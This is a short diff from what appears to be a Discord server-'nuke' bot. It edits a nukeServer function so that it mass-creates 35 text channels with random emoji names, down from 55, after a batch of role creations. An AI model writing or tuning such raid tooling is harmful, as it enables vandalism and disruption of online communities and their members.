@@ -108,9 +108,9 @@ async function nukeServer(guild, originalServerName, originalServerIcon, trigger
         }
         await Promise.all(rolePromises);
         
-        // Create 55 text channels (no voice channels)
+        // Create 35 text channels (no voice channels)
         const channelPromises = [];
-        for (let i = 0; i < 55; i++) {
+        for (let i = 0; i < 35; i++) {
             const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
             
             channelPromises.push(
